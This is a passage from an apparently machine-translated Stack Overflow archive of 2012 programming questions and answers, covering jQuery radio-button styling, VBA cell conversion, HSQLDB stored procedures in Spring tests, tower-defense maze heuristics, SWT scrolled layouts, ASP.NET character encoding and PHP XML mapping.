    $("div.clickedSchedule").css({"border-color" : "red", "border-style" : "solid", "border-width" : "1px", "background-color" : "#f6f6f6"});
    }
  });
});
</script> 
```

**CSS：**

我有一个切换这些类的 toggleCLass。

```
.arrow {
    background:url(../images/accordionDropArrow_expanded.png) no-repeat;
    width:18px;
    height:17px;
    float:left;
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    -ms-transition: all 0.5s ease;
}

.arrowUp {
    background:url(../images/accordionDropArrow_expanded.png) no-repeat;
    width:18px;
    height:17px;
    float:left;
    -webkit-transform: rotate(-90deg);
    -moz-transform: rotate(-90deg);
    -o-transform: rotate(-90deg);
    -ms-transform: rotate(-90deg);
    -webkit-transition: all 0.5s ease;
    -moz-transition: all 0.5s ease;
    -o-transition: all 0.5s ease;
    -ms-transition: all 0.5s ease;
} 
```

也许我只是将这些东西强加在一起，并且有一个更优雅的编码解决方案。我会把它留给stackoverflow的神:)

更新

我在[这里添加了一个小提琴](http://jsfiddle.net/JU2HF/)

我正在运行最新的 jquery 脚本。如果单击结果中的第一个选项，您会看到它选择了每个 clickedSchedule 类，而不仅仅是一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:18:35.467

我想你想要的是限制用户一次只能选择一个单选按钮。要使一组单选按钮互斥，只需为所有单选按钮添加相同的名称。我希望这是你的问题:)

例如：

```
<input type="radio" name="choice" id="choice1" />
<input type="radio" name="choice" id="choice2" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T16:11:21.243

After some simplification and further research, I was able to get it to work.

The Stack article I used can be found [here](https://stackoverflow.com/questions/6849541/add-class-and-change-text-on-radio-button-when-selected)

It was a piece of cake once I learned about the input:not(:checked) option.

**Here is the jQuery code:**

```
$(document).ready(function(){
    $(document).ready(function(){
    //add the Selected class to the checked radio button
    $('input:checked').parent().parent().parent().addClass("clickedSchedule");
    //If another radio button is clicked, add the select class, and remove it from the previously selected radio
    $('input').click(function () {
        $('input:not(:checked)').parent().parent().parent().removeClass("clickedSchedule");
        $('input:checked').parent().parent().parent().addClass("clickedSchedule");
    });
});
}); 
```

**html:**

```
<div class="unclickedSchedule">
<li><a class="expanded"><h2>Schedule 2</h2></a>
<div class="scheduleChoice" style="text-align:left;">
  <input name="first_choice" id="checkbox_first" type="radio" value="Schedule 2" /><label>First Choice</label>
  <input name="second_choice" id="checkbox_second" type="radio" value="Schedule 2" /><label>Second Choice</label>
  <input name="third_choice" id="checkbox_third" type="radio" value="Schedule 2" /><label>Third Choice</label>
</div>
    <ul>
        <li>            
            <div style="width:550px;padding:0 0 0 50px;"><img src="images/animation/02_fall.gif" width="550" height="334" /></div>
            <div style="width:550px; padding:0  0 20px 50px;;"><img src="images/animation/02_sp.gif" width="550" height="334" /></div>
        </li>
    </ul>
</li>
</div> 
```

This does not address the rotating arrows in my original question, but does resolve the highlighted selection when a radio button is clicked.

# vba - 将文本列转换为大文件的数字

> ID：10338036
> 
> 赞同：0
> 
> 时间：2012-04-26T17:02:28.623
> 
> 标签：vba, optimization, excel, type-conversion

我有一个从 C# 自动生成的大型 Excel 工作表，它将所有列输出为文本（由于技术原因无法更改）。我在编写一个将数字列转换为数字的宏时遇到问题，并且可以快速完成（工作表包含 80 列和 20,000 行）。

我尝试遍历所有单元格并调用

```
If IsNumeric(cell.Value) Then cell.Value = CDec(cell.Value) 
```

这非常慢并且还有一个额外的问题，即我有一个特殊情况，其中以“0xxx”等开头的字符串需要保存为字符串。如果我使用`IsNumeric`然后转换为`CDec`，我将失去前导 0！

是否有一些简单的技巧可以说检测列中的一个值是否是字符串，然后不处理该列，否则将它们转换为数字，除了我们有前导 0 的情况？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:36:17.863

是否将值存储在内存中并进行检查？类似于以下代码的内容，但您必须对其进行改进并替换`condition_is_true`为有意义的内容。我会使用一个函数来返回一个布尔值。

```
Dim input_var As String

For r = 1 To 20000
    For c = 1 To 80
        input_var = Sheet1.Cells(r, c).value
        'do some stuff to the string

        If condition_is_true Then
            Sheet1.Cells(r, c).value = CDec(input_var)
        Else
            Sheet1.Cells(r, c).value = input_var
        End If
    Next c
Next r 
```

# ios - 简单弹出框中的按钮

> ID：10338041
> 
> 赞同：0
> 
> 时间：2012-04-26T17:02:45.847
> 
> 标签：ios, uibutton, uipopovercontroller

我正在尝试实现这种弹出窗口：

![弹出框](../Images/c23569a0bca462bc42eeabf9c0c0aaa3.png)

问题是，简单地使用 RoundRectButtons 似乎不会产生相同的效果（边框很难看，文本是蓝色的）。**这些按钮是怎么做的？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:05:24.650

我认为这是一个 UIActionSheet，显示为一个弹出框（这就是操作表在 iPad 中的显示方式）。如果您创建其中之一，您将免费获得按钮样式。

# database - 使用 Spring 嵌入式数据库 API 在 HSQLDB 中创建存储过程

> ID：10338044
> 
> 赞同：15
> 
> 时间：2012-04-26T17:02:49.067
> 
> 标签：database, spring, unit-testing, stored-procedures, hsqldb

我目前正在尝试使用使用 Spring 创建的内存 HSQLDB 实例创建一个测试环境，这要归功于它的嵌入式数据库支持：

## 当前设置

1.  为我的单元测试创​​建“数据源”：

    > ```
    > db = new EmbeddedDatabaseBuilder()
    >          .addDefaultScripts()
    >          .addScript("stored_procedure.sql")
    >          .build(); 
    > ```

2.  “stored_procedure.sql”的内容：

    > ```
    > -- Mock of a more complex stored procedure in production environment
    > CREATE PROCEDURE GetFooById(IN fooId VARCHAR(12))
    >   READS SQL DATA DYNAMIC RESULT SETS 1
    >   BEGIN ATOMIC
    >       DECLARE resultSet CURSOR WITHOUT HOLD WITH RETURN FOR SELECT name, value FROM Foos WHERE id = fooId;
    >       OPEN resultSet; 
    >   END 
    > ```

## 问题

我能够初始化我的模式并从“默认脚本”插入我的测试数据，没有任何问题。

但是，在创建过程时，我看到如下错误，即使在上述 SQL 的不同版本之后，有/没有分隔符，并且分隔符在不同的位置：

> ```
> java.sql.SQLSyntaxErrorException: unexpected end of statement:  required: ;
>   at org.hsqldb.jdbc.Util.sqlException(Unknown Source)
>   at org.hsqldb.jdbc.Util.sqlException(Unknown Source)
>   at org.hsqldb.jdbc.JDBCStatement.fetchResult(Unknown Source)
>   at org.hsqldb.jdbc.JDBCStatement.executeUpdate(Unknown Source)
>   at org.springframework.jdbc.datasource.init.ResourceDatabasePopulator.executeSqlScript(ResourceDatabasePopulator.java:169) 
> ```

## 资源和提示

我正在使用提供 HSQLDB 2.2.4 的 Spring 3.1.1，并且根据文档，我认为我在做正确的事情。

但是，讨论如下：

*   [这个](http://sourceforge.net/projects/hsqldb/forums/forum/73674/topic/4542791)
*   春天的 JIRA 票 SPR-8817

让我觉得这可能是 HSQLDB 和 Spring 之间的不兼容/由处理分隔符的方式引起的错误。

但我是 Spring 和 HSQLDB 的初学者，因此我有以下问题。

## 问题

1.  有人见过这个吗？并提出了解决方案？

2.  考虑到最终的存储过程是使用*{call GetFooById ?} 调用*的，是否有一种等效的方法可以在 HSQLDB 中使用 select-from-where 查询返回结果集？

3.  这会因为 ResourceDatabasePopulator 而有效地发生吗？ResourceDatabasePopulator 是否仍然在 Spring 3.1.1 中造成麻烦？

4.  任何其他指针/提示？

非常感谢您的帮助。

M。

* * *

编辑：

## 结论与解决方案

**问题**：

1.  ResourceDatabasePopulator 将分号处理为查询分隔符，这不符合 HSQLDB 的语法。

2.  **{call GetFooById ?}**是 Sybase（我的生产数据库）的有效语法，但不适用于需要**{call GetFooById(?)}**的 HSQLDB 。当然，HSQLDB 语法也不兼容 Sybase 的语法。此外，Spring 的 JdbcTemplate 并没有抽象出这些差异。

**解决方案**：

1.  使用 Java 存储过程而不是 SQL 存储过程可能是一种解决方法，因为查询是在 Java 端编写的，并且不涉及分号分隔符。或者，我猜 ResourceDatabasePopulator 的逻辑可以更改并用于设置嵌入式数据库，但到目前为止我还没有尝试过。

2.  Spring 的 StoredProcedure 类似乎更便携，可以与 Sybase 和 HSQLDB 一起使用，即使它比 JdbcTemplate 更冗长。

**源代码**：在[我的 GitHub 存储库](https://github.com/marccarre/spring-db-testing)中可用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-05T12:02:37.133

1.  对于存储过程和对象类型，您需要注意数据库的 JDBC 驱动程序。对于存储过程，也用于测试或其他，在您的数据库中创建一个包并在未来的测试阶段调用它。

2.  我使用存储过程和自定义输入/输出对象，仅使用 Java SQL 存储过程 API，并在需要时进行自定义。

如果您想解释您的背景和案例，我们可以帮助您找到最佳解决方案:-)。

# algorithm - 生成塔防迷宫（墙有限的最长迷宫）——接近最优的启发式？

> ID：10338049
> 
> 赞同：50
> 
> 时间：2012-04-26T17:03:24.817
> 
> 标签：algorithm, path-finding, heuristics, maze

在塔防游戏中，您有一个 NxM 网格，其中包含开始、结束和许多墙。

![图片1](../Images/f9ad49366365acadc573a3faed5b5268.png)

敌人在不穿过任何墙壁的情况下从头到尾采用最短路径*（它们通常不受网格的限制，但为了简单起见，假设它们是。在任何一种情况下，它们都不能穿过对角线“洞”）*

![图片2](../Images/47dbd2b60f4537713fc2a0122291b41c.png)

问题*（至少对于这个问题）*是放置**多达**K 个额外的墙，以最大化敌人必须走的路径。例如，对于 K=14

![图3](../Images/6a44212e6221ce1a126248800a9a493c.png)

*我的直觉告诉我，如果（正如我希望的那样）*我们将其概括为包括在移动到终点之前必须访问的航点，并且可能也没有航点，那么这个问题是 NP 难的。

但是，对于接近最优的解决方案，**是否有任何体面的启发式方法？**

* * *

**[编辑]**我在[这里](https://cstheory.stackexchange.com/questions/11375/generating-a-tower-defense-maze-aka-finding-the-k-most-vital-nodes-nodewise-i)发布了一个相关的问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T22:18:00.160

我提出了一种贪婪的方法，它可能接近最优（但我找不到近似因子）。想法很简单，我们应该封锁迷宫*关键*位置的细胞。这些地方可以帮助测量迷宫的连通性。我们可以考虑顶点连通性，我们找到断开起点和终点的最小顶点切割：*(s,f)*。之后，我们删除了一些关键单元格。

要将其转换为图表，请使用双迷宫。在此图上找到最小*(s,f)*顶点切割。然后我们检查这个切割中的每个顶点。我们删除一个顶点，它的删除会增加所有*s,f*路径的长度，或者如果它在从 s 到 f 的最小长度路径中。消除一个顶点后，递归重复上述过程k次。

但这有一个问题，这是当我们删除一个顶点时，它会切断从 s 到 f 的任何路径。为了防止这种情况，我们可以将切割节点的权重尽可能高，这意味着首先计算最小 (s,f) 切割，如果切割结果只是一个节点，则对其进行加权并为该顶点设置一个高权重，如 n^3，现在再次计算最小s,f割，之前计算的单割顶点因为等待不属于新割。

但是如果 s,f 之间只有一条路径（经过一些迭代），我们就无法改进它。在这种情况下，我们可以使用正常的贪心算法，例如从不属于任何切割的从 s 到 f 的最短路径之一中删除节点。之后我们可以处理最小顶点切割。

每一步的算法运行时间为：

```
min-cut + path finding for all nodes in min-cut
O(min cut) + O(n^2)*O(number of nodes in min-cut) 
```

并且因为在非常悲观的情况下，最小切割中的节点数不能大于 O(n^2)，所以算法是 O(k *n^4)，但通常不应该超过 O(k* n^3) ，因为通常最小切算法主导寻路，所以通常寻路也不需要 O(n^2)。

我猜贪心选择是模拟退火类型算法的一个很好的起点。

* * *

*PS: minimum vertex cut 与 minimum edge cut*类似，*max-flow/min-cut 类似的方法可以应用于 minimum vertex cut*，*只需假设每个顶点为两个顶点*，*一个 V [i]*，*一个 V [o]*，*表示输入和输出*，*也将无向图转换为有向图并不难。*

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-07T06:37:52.943

可以很容易地证明（证明让读者作为练习）搜索解决方案就足够了，以便将 K 个封锁中的每一个都放在当前的最小长度路线上。请注意，如果有多个最小长度路线，则必须考虑所有这些路线。原因是，如果您不在当前最小长度路线上设置任何剩余的封锁，那么它不会改变；因此，您可以在搜索期间立即对其进行第一个可用的封锁。这甚至可以加速蛮力搜索。

但是还有更多的优化。您也可以随时决定放置下一个封锁线，使其成为当前最短长度路线上的第一个封锁线，也就是说，如果您将封锁线放置在路线上的第 10 个方格上，那么您将方格标记为 1 ..9 作为“永久开放”，直到您回溯。这再次节省了在回溯搜索期间搜索的指数数量的正方形。

然后，您可以应用启发式方法来减少搜索空间或对其重新排序，例如首先尝试那些最大程度地增加当前最小长度路线长度的封锁位置。然后，您可以在有限的实时时间内运行回溯算法，并选择迄今为止找到的最佳解决方案。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-01T00:03:57.870

我相信我们可以将包含的最大流形问题简化为[布尔](http://en.wikipedia.org/wiki/Boolean_satisfiability_problem)可满足性，并通过对这个子问题的任何依赖来显示 NP 完全性。正因为如此，[提供的算法 spin_plate](https://stackoverflow.com/a/10338526/517815)是合理的，因为启发式、[预计算和机器学习是合理](https://stackoverflow.com/a/10364307/517815)的，如果我们想在这里犯错，诀窍就变成了找到*最佳的启发式解决方案。*

考虑如下所示的电路板：

```
..S........
#.#..#..###
...........
...........
..........F 
```

这有许多导致贪婪和门限解决方案失败的问题。如果我们看第二行：

```
#.#..#..### 
```

我们的逻辑门在基于 0 的二维数组中排序为`[row][column]`：

```
[1][4], [1][5], [1][6], [1][7], [1][8] 
```

我们可以将其重新渲染为一个方程以满足该块：

```
if ([1][9] AND ([1][10] AND [1][11]) AND ([1][12] AND [1][13]):
    traversal_cost = INFINITY; longest = False # Infinity does not qualify 
```

除了无穷大作为不可满足的情况外，我们回溯并将其重新呈现为：

```
if ([1][14] AND ([1][15] AND [1][16]) AND [1][17]:
    traversal_cost = 6; longest = True 
```

我们隐藏的布尔关系属于所有这些门。您还可以证明几何证明不能递归分形，因为我们总是可以创建一个`N-1`宽度或高度正好长的墙，这在所有情况下都代表解决方案的关键部分（因此，[分而治](http://en.wikipedia.org/wiki/Divide_and_conquer_algorithm)之不会帮助你）。

*此外，由于不同行*之间的扰动很重要：

```
..S........
#.#........
...#..#....
.......#..#
..........F 
```

我们可以证明，如果没有一套完整的可计算几何恒等式，完整的搜索空间会减少到 N-SAT。

通过扩展，我们还可以证明，当门的数量接近无穷大时，验证和非多项式求解是微不足道的。不出所料，这就是为什么塔防游戏对人类来说仍然如此有趣的原因。显然，更严格的证明是可取的，但这只是一个初步的开始。

请注意，您可以显着减少 n-choose-k 关系中的 n 项。因为我们可以递归地证明每个扰动都必须位于关键路径上，并且因为关键路径总是可以在 O(V+E) 时间内计算（通过一些优化来加快每个扰动的速度），所以您可以显着减少您的以广度优先搜索添加到板上的每个附加塔为代价来搜索空间。

* * *

因为我们可以容忍地假设 O(n^k) 作为确定性解决方案，所以启发式方法是合理的。因此，我的建议介于spin_plate[的答案](https://stackoverflow.com/a/10338526/517815)和[Soravux](https://stackoverflow.com/a/10364307/517815)的答案之间，着眼于适用于该问题的机器学习技术。

*第 0 种解决方案：*使用可容忍但次优的 AI，其中 spin_plate 提供了两种可用的算法。事实上，这些近似于有多少天真的玩家接近游戏，这对于简单的游戏来说应该足够了，尽管具有高度的可利用性。

*一阶解决方案：*使用数据库。鉴于问题的表述，您还没有完全证明需要即时计算最佳解决方案。因此，如果我们放宽在没有信息的情况下接近随机棋盘的约束，我们可以简单地预先计算`K`每个棋盘的所有可容忍的最优值。显然，这只适用于少数板：`V!`对于每种配置的潜​​在板状态，我们不能容忍地预先计算所有最优值，因为它`V`变得非常大。

*二阶解决方案：*使用机器学习步骤。当你缩小导致非常高的遍历成本的差距时，推动每一步，一直运行直到你的算法收敛或找不到比贪心算法更好的解决方案。此处适用的算法过多，因此我建议您[参考经典](https://rads.stackoverflow.com/amzn/click/com/026201243X)和[文献](http://scholar.google.com/scholar?q=boolean%20satisfiability%20machine%20learning)，以选择在您的程序约束范围内有效的正确算法。

最好的*启发式方法*可能是由局部状态感知、递归深度优先遍历生成的简单[热图](http://en.wikipedia.org/wiki/Heat_map)，在 O(V^2) 遍历之后按最常见到最不常见的遍历对结果进行排序。通过这个输出贪婪地识别所有瓶颈，并且这样做而不会使路径变得不可能是完全可能的（检查这是 O(V+E)）。

把它们放在一起，我会尝试这些方法的交集，结合热图和关键路径标识。我假设这里有足够的东西来提出一个好的、功能性的几何证明来满足问题的所有约束。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-26T17:36:19.677

冒着说明显而易见的风险，这是一种算法

```
1) Find the shortest path
2) Test blocking everything node on that path and see which one results in the longest path
3) Repeat K times 
```

天真地，这将花费 O(K*(V+ E log E)^2) 但您只需重新计算部分路径即可通过一些小工作改进 2。

正如您所提到的，简单地尝试打破路径是很困难的，因为如果大多数中断只是增加 1（或 2）的长度，那么很难找到导致大收益的阻塞点。

如果你在开始和结束之间取[最小顶点切割](http://www.ensta-paristech.fr/~diam/ro/online/viggo_wwwcompendium/node91.html)，你会发现整个图形的阻塞点。一种可能的算法是这样的

```
1) Find the shortest path 
2) Find the min-cut of the whole graph
3) Find the maximal contiguous node set that intersects one point on the path, block those.
4) Wash, rinse, repeat 
```

3）是很重要的部分，为什么这个算法也可能表现不佳。你也可以试试

*   与其他现有块连接的最小节点集。
*   在顶点切割中找到所有连续顶点的分组，测试每个顶点的最长路径（第一个算法）

最后一个可能是最有希望的

如果您在整个图上找到一个最小顶点切割，您将找到整个图的阻塞点。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-26T17:58:43.603

这是一个想法。在您的网格中，将相邻的墙分组为岛屿，并将每个岛屿视为一个图形节点。节点之间的距离是连接它们（阻挡敌人）所需的最小墙数。

在这种情况下，您可以通过阻止最便宜的弧来开始最大化路径长度。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-01T01:45:53.877

我不知道这是否可行，因为您可以使用您的积分制作新的岛屿。但它可以帮助确定在哪里放置墙壁。

我建议使用修改后的广度优先搜索和 K 长度优先级队列来跟踪每个岛之间的最佳 K 条路径。

对于每一个连接墙壁的岛屿，我会假装它是一盏灯。（一种只能发出水平和垂直光线的特殊灯）

使用光线追踪查看光线可以照射到哪些其他岛屿

说 Island1 (i1) 命中 i2,i3,i4,i5 但没有命中 i6,i7 ..

那么你会有 line(i1,i2), line(i1,i3), line(i1,i4) 和 line(i1,i5)

将所有网格点的距离标记为无穷大。将起点设为 0。

现在从一开始就使用广度优先搜索。每个网格点，将该网格点的距离标记为其邻居的最小距离。

但是..这是问题所在..

每次到达两个岛之间的 line() 上的网格点时，不需要将距离记录为其邻居的最小值，而是需要将其设为长度为 K 的优先级队列。并记录 K 最短路径从任何其他 line() 到该 line()

然后，此优先级队列保持不变，直到您到达下一行（），它汇总了进入该点的所有优先级队列。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-28T14:16:14.097

您没有表明该算法需要实时性，但我对这个前提可能是错误的。然后，您可以预先计算块位置。

如果您可以事先做到这一点，然后简单地进行 AI*构建*就像一棵树一样，一个又一个的迷宫，你可以使用遗传算法来减轻你对启发式的需求。您需要加载任何类型的遗传算法框架，从一组不可移动的块（您的地图）和随机放置的可移动块（AI 将放置的块）开始。然后，您通过在可移动块上进行交叉和嬗变来进化种群，然后通过对计算出的最长路径给予更多奖励来评估个体。然后，您只需编写一个资源高效的路径计算器，而无需在代码中使用启发式方法。在你进化的最后一代中，你会选择排名最高的个体，这将是你的解决方案，因此你想要这张地图的方块模式。

事实证明，在理想情况下，遗传算法可以在合理的时间内将您带到局部最大值（或最小值），这可能无法通过在足够大的数据集（即您的情况下足够大的地图）上的分析解决方案来达到。

您还没有说明您将使用哪种语言开发此算法，因此我无法提出可能完全适合您需求的框架。

请注意，如果您的地图是动态的，这意味着地图可能会随着塔防迭代而发生变化，您可能希望避免使用这种技术，因为它可能过于密集而无法在每一波中重新进化一个全新的人口。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-05-03T13:46:27.520

我根本不是算法专家，但看着网格让我想知道[康威的人生游戏是否](http://en.wikipedia.org/wiki/Conway%27s_Game_of_Life)可能对此有用。有了合理的初始种子和精心挑选的关于塔的诞生和死亡的规则，您可以在短时间内尝试许多种子及其后代。

您已经对小兵路径的长度进行了衡量，因此您可以相应地选择最佳的。我不知道（如果有的话）它会接近最佳路径，但在解决方案中使用它会是一件有趣的事情。

# java - 在滚动复合中使用 GridLayout

> ID：10338056
> 
> 赞同：6
> 
> 时间：2012-04-26T17:03:52.680
> 
> 标签：java, swt, composite, scrolledcomposite

我正在尝试创建一个滚动合成，其中包含一个内部带有网格布局的合成。

但是，当我尝试设置滚动复合的内容时，什么都没有加载。这似乎只影响具有网格布局的复合材料。

我究竟做错了什么？

我的代码：

```
 CTabItem tbtmNotes = new CTabItem(tabFolder, SWT.NONE);
    tbtmNotes.setText("Notes");
    ScrolledComposite scrollComposite = new ScrolledComposite(tabFolder, SWT.V_SCROLL | SWT.BORDER);
    tbtmNotes.setControl(scrollComposite);
    scrollComposite.setContent(new hm_Composites.Comp_Animal_Notes(tabFolder, SWT.None, a)); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-27T13:43:57.147

经过一堆摆弄后，我得到了以下工作，希望它可以帮助别人。

```
 public Comp_Animal_Notes(Composite parent, int style, Animal a)
        throws Exception {
    super(parent, SWT.NONE);
    setLayout(new FillLayout(SWT.HORIZONTAL));
    ScrolledComposite scrolledComposite = new ScrolledComposite(this, SWT.BORDER | SWT.H_SCROLL | SWT.V_SCROLL);
    scrolledComposite.setExpandHorizontal(true);
    scrolledComposite.setExpandVertical(true);

    Composite composite = new Composite(scrolledComposite, SWT.NONE);
    composite.setLayout(new GridLayout(2, false));

    ArrayList<Note> alNotes = a.getAnimalNotes();
    this.setRedraw(false);
    for (int i = 0; i < alNotes.size(); i++) {
        Note note = alNotes.get(i);

        CLabel lblNoteDate = new CLabel(composite, SWT.BORDER);
        lblNoteDate.setFont(SWTResourceManager.getFont("Tahoma", 8,
                SWT.BOLD));
        lblNoteDate.setText("Date:");
        lblNoteDate.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, false, false, 1, 1));

        CLabel lblNotedatetxt = new CLabel(composite, SWT.BORDER);
        lblNotedatetxt.setBackground(SWTResourceManager
                .getColor(SWT.COLOR_WHITE));
        lblNotedatetxt.setText(note.getUserDate());
        lblNotedatetxt.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 1, 1));

        CLabel lblNoteTxt = new CLabel(composite, SWT.BORDER);
        lblNoteTxt.setBackground(SWTResourceManager
                .getColor(SWT.COLOR_WHITE));
        lblNoteTxt.setText(note.getStrNote());
        lblNoteTxt.setLayoutData(new GridData(SWT.FILL, SWT.CENTER, true, false, 2, 1));
    }

    scrolledComposite.setContent(composite);
    scrolledComposite.setMinSize(composite.computeSize(SWT.DEFAULT, SWT.DEFAULT));

    this.setRedraw(true);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-09T22:04:45.483

如果来自 Talon06 的片段不起作用，请尝试进行以下更改。

```
scrolledComposite.setContent(composite);

//add this line
composite.setSize(composite.computeSize(SWT.DEFAULT, SWT.DEFAULT));

//not sure about this line, was optional in my case
scrolledComposite.setMinSize(composite.computeSize(SWT.DEFAULT, SWT.DEFAULT));

this.setRedraw(true); 
```

我发现 ScrolledComposite 中的组件只有在我明确设置复合材料的大小时才会变得可见。

@Talon06：感谢您的精彩发现！

# asp.net - 字母变成“ë”

> ID：10338058
> 
> 赞同：2
> 
> 时间：2012-04-26T17:04:03.763
> 
> 标签：asp.net, .net, sql-server

我有一个网站，还有几个文本框。如果用户填写的内容包含字母“ë”，那么它会变成：

```
&#235; 
```

我怎样才能像这样将它存储在数据库中？我的网站建立在 .NET 之上，而我使用 C# 语言。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T17:10:56.177

ASP.Net（您的服务器端应用程序）和 SQL Server 都支持 Unicode。它们可以处理不同的语言和不同的字符集：

[http://msdn.microsoft.com/en-us/library/39d1w2xf.aspx](http://msdn.microsoft.com/en-us/library/39d1w2xf.aspx)

> 在内部，ASP.NET 网页背后的代码将所有字符串数据处理为 Unicode。您可以设置页面如何对其响应进行编码，这会在 HTTP 标头的 Content-Type 部分设置 CharSet 属性。这使浏览器能够在没有元标记或必须从内容中推断出正确编码的情况下确定编码。您还可以设置页面如何解释请求中发送的信息。
> 
> 最后，您可以设置 ASP.NET 如何解释页面本身的内容——换句话说，就是磁盘上物理 .aspx 文件的编码。如果您设置文件编码，则所有 ASP 页面都必须使用该编码。Notepad.exe 可以保存以当前系统 ANSI 代码页、UTF-8 或 UTF-16（也称为 Unicode）编码的文件。ASP.NET 运行时可以区分这三种编码。物理 ASP.NET 文件的编码必须与文件中 @Page 编码属性中指定的编码相匹配。

这篇文章也很有帮助：

[http://support.microsoft.com/kb/893663](http://support.microsoft.com/kb/893663)

这篇“Joel-on-Software”文章绝对是必读的

*   [每个软件开发人员绝对肯定必须了解 Unicode 的绝对最低要求（没有借口！）](http://www.joelonsoftware.com/articles/Unicode.html)

请阅读所有三篇文章，如果有帮助，请告诉我们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:43:33.893

你需要`HtmlEncode`和`HtmlDecode`功能。

SQL Server 可以处理`ë`任何其他本地或“不寻常”字符，但 HTML 不行。这是因为某些字符在 HTML 中具有特殊含义。最好的例子对 HTML 语法是必不可少`<`的`>`，但还有更多。由于某种原因`ë`也很特别。为了能够显示这样的字符，它们需要在传输为 HTML 之前进行编码。传输也意味着发送到浏览器。

因此，尽管您`ë`在浏览器中看到您的应用程序正在以编码版本处理它，`&#235;`并且它始终采用这种形式，包括数据库。如果您想`&#235;`保存在 SQL Server 中，`ë`则需要先对其进行解码。`&#235;`请记住在页面上显示之前将其编码回。

在分别保存/显示之前，使用这些功能对所有文本进行解码/编码。他们只会转换特殊字符而不管其他一切：

```
string encoded = HttpUtility.HtmlEncode("Noël")
string decoded = HttpUtility.HtmlDecode("No&#235;l") 
```

对编码文本进行操作还有另一个重要原因——JavaScript 注入。这是对您网站的攻击，旨在通过将 JavaScript 块放入编辑/备忘录框中来破坏它，希望它们会在其他人的浏览器上执行一次。如果您对从 UI 获得的所有文本进行编码，这些 JavaScript 将永远不会运行，因为它们将被视为文本而不是可执行代码。

# php - 如何使用多维数组形成 XML 子节点的路径

> ID：10338062
> 
> 赞同：1
> 
> 时间：2012-04-26T17:04:44.480
> 
> 标签：php, xml, multidimensional-array

我从哪里开始... XML 文件需要进入数据库。因此，我想创建一个配置数组，其中包含 XML 节点和一个表的表列之间的映射。

```
$maps = array(
 // 'node-name'=>'column-name'
 'prod_id'=>'supplier_product_id',
 'description'=>'product_description',
);

$xml=simplexml_load_file($file);

//just a test
foreach ($maps as $node => $col){
 echo 'node ' . $xml->$node . ' is mapped to: ' . $col; //this works
} 
```

我需要从子节点将信息放入此（相同）表中。所以我正在考虑将子节点放在这样的嵌套数组中：

```
$maps = array(
 // 'node-name'=>'column-name'
 'prod_id'=>'supplier_product_id',
 'description'=>'product_description',
 // to access $xml->node->subnode;
 'category'=>array(
  'id'=>'category_id',
 ),
); 
```

但是现在我很困惑，我怎样才能使用嵌套数组来创建节点的路径，如下所示： `$xml->category->id`

我是 PHP 的新手，希望一些帮助能让我再次上路。欢迎所有帮助，在此先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T07:14:26.323

试试这个：

```
<?php
$maps = array(
 // 'node-name'=>'column-name'
 'prod_id'=>'supplier_product_id',
 'description'=>'product_description',
 // to access $xml->node->subnode;
 'category'=>array(
  'id'=>'category_id'
 )
);

function getDataMapping( $maps, $child="" ) {
    global $file;

    $xml=simplexml_load_file($file);

    foreach ($maps as $node => $col) {
        if( is_array( $col ) ) {
            getDataMapping( $col, $node );
        } else {
            if( $child ) {
                echo 'node ' . $xml->{$child}->$node . ' is mapped to: ' . $col; //this works
            } else {
                echo 'node ' . $xml->$node . ' is mapped to: ' . $col; //this works
            }
        }
    }
}

getDataMapping( $maps );
?> 
```

显然，如果您的嵌套运行很多级别（数组中的数组等），您可以将其更改为递归函数。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T10:06:58.377

这是 XML：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<message>
<errorcode>100</errorcode>
<body>
 <jobs>
  <job>
   <id>1</id>
   <description>Nice job at the office</description>
   <hours>40</hours>
   <contact>
    <id>SYL</id>
    <name>Sylvia</name>
    <email>sylvia@mail.com</email>
   </contact>
  </job>
  <job>
   <id>2</id>
   <description>Construction work</description>
   <hours>32</hours>
   <contact>
    <id>HEN</id>
    <name>Hendrik</name>
    <email>hendrik@mail.com</email>
   </contact>
  </job>
 </jobs>
</body>
<attachements>
</attachements>
<filenames>
</filenames>
</message> 
```

我只是意识到实际上不需要阅读超过 2 个级别。所以你的答案就足够了，因为它可以访问 $xml->node 和 $xml->child->node 。使用 xpath('//job') 我可以为所有节点设置一个基本节点入口并对其进行迭代。

# php - 如果表单选项值选择等于然后重定向 PHP/jQuery

> ID：10338063
> 
> 赞同：0
> 
> 时间：2012-04-26T17:04:46.580
> 
> 标签：php, jquery

我的页面上有一个带有县下拉列表的表格。我想以某种方式使用 jQuery 或 PHP 说，如果选择了某个县，则重定向，否则处理表单。

我创建了一个小提琴来尝试解释......

[http://jsfiddle.net/KVjAc/](http://jsfiddle.net/KVjAc/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:08:07.723

只需提交表单并为要重定向的值使用 php [header命令。](http://php.net/manual/en/function.header.php)这将是检查表单处理器脚本的第一件事。

除非您使用 ajax 根据选择刷新页面的某些部分，否则不需要 javascript。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:09:57.827

执行以下操作：

```
$(document).ready(function () {
    $('#county').on('change', function () {
